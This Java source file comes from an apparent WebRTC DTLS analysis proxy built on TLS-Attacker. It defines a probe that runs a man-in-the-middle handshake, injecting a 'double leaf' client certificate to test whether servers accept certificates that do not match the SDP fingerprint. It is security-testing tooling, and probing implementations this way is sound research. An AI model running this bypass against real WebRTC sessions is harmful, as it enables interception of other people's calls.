/*
 * WebRTC-DTLS-Analysis-Proxy
 *
 * Copyright 2022-2025 Technology Innovation Institute (TII), Abu Dhabi
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */
package de.rub.nds.dtlsproxy.probes.rtp.dtlsbypass;

import de.rub.nds.dtlsproxy.action.DynamicCertificateInjectionAction;
import de.rub.nds.dtlsproxy.action.ForwardServerFlightAction;
import de.rub.nds.dtlsproxy.config.ProxyConfiguration;
import de.rub.nds.dtlsproxy.enums.WebRtcProperties;
import de.rub.nds.dtlsproxy.report.WebRtcPlatformReport;
import de.rub.nds.dtlsproxy.util.TraceUtil;
import de.rub.nds.dtlsproxy.util.X509Util;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.protocol.message.CertificateVerifyMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.ForwardMessagesAction;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveTillAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendDynamicClientKeyExchangeAction;
import de.rub.nds.x509attacker.filesystem.CertificateBytes;
import java.util.List;

public class DoubleLeafClientCertBypass extends AuthBypass {

    private final boolean realFirst;

    public DoubleLeafClientCertBypass(boolean realFirst) {
        super("Ignore client, present double leaf client certificate", false, true);
        this.realFirst = realFirst;
    }

    /**
     * Creates a trace based on the assumption that the server accepts certificates not matching the
     * SDP fingerprinting, if the client's real certificate is contained. The client is left at the
     * CH
     *
     * <pre>
     *
     * Client                    MitM                  Server
     * -------------------------------------------------------
     * |---ClientHello--->|     Forward   |---ClientHello--->|
     * |<-SH,C*,SKE,CR,SHD| Forward Flight|<-SH,C*,SKE,CR,SHD|
     * |----Certificate-->|   Inject Cert |--Certificate*--->|
     *                    |      Send     |--CKE,CV,CCS,FIN-->
     *                    |  Receive Till |<-----Finished----|
     *
     * </pre>
     */
    public WorkflowTrace createTrace(
            WebRtcPlatformReport report, ProxyConfiguration proxyConfiguration) {

        Config config = createConfig(proxyConfiguration, report);

        // set default cert chain to null for TLS-Attacker to use custom chain in CertificateMessage
        // instead
        config.setDefaultExplicitCertificateChain((List<CertificateBytes>) null);

        WorkflowTrace trace =
                TraceUtil.createMitmEntryTrace(
                        config,
                        ATTACKER_TO_SERVER_CONNECTION,
                        CLIENT_TO_ATTACKER_CONNECTION,
                        report);

        trace.addTlsAction(
                new ForwardMessagesAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        ATTACKER_TO_SERVER_CONNECTION,
                        new ClientHelloMessage()));
        trace.addTlsAction(
                new ForwardServerFlightAction(
                        ATTACKER_TO_SERVER_CONNECTION, CLIENT_TO_ATTACKER_CONNECTION, true, false));
        // the original one
        trace.addTlsAction(
                new DynamicCertificateInjectionAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        ATTACKER_TO_SERVER_CONNECTION,
                        realFirst,
                        false));
        trace.addTlsAction(new SendDynamicClientKeyExchangeAction(ATTACKER_TO_SERVER_CONNECTION));
        trace.addTlsAction(
                new SendAction(
                        ATTACKER_TO_SERVER_CONNECTION,
                        new CertificateVerifyMessage(),
                        new ChangeCipherSpecMessage(),
                        new FinishedMessage()));
        trace.addTlsAction(
                new ReceiveTillAction(ATTACKER_TO_SERVER_CONNECTION, new FinishedMessage()));
        return trace;
    }

    @Override
    public Config createConfig(ProxyConfiguration configuration, WebRtcPlatformReport report) {
        Config config = super.createConfig(configuration, report);
        X509Util.applySupportedSignatureAndHashAlgorithm(config, report, true);
        return config;
    }

    @Override
    public boolean isApplicable(WebRtcPlatformReport report) {

        if (!basicExecutionRequirementsMet(report)) {
            return false;
        }
        if (!isTrue(report, WebRtcProperties.SERVER_REQUESTS_CERTIFICATE)) {
            return false;
        }

        if (realFirst) {
            if (!isFalse(report, WebRtcProperties.SERVER_REJECTS_DOUBLE_LEAF_TRICK_REAL_ATTACKER)) {
                return false;
            }
        } else {
            if (!isFalse(report, WebRtcProperties.SERVER_REJECTS_DOUBLE_LEAF_TRICK_ATTACKER_REAL)) {
                return false;
            }
        }

        return true;
    }
}
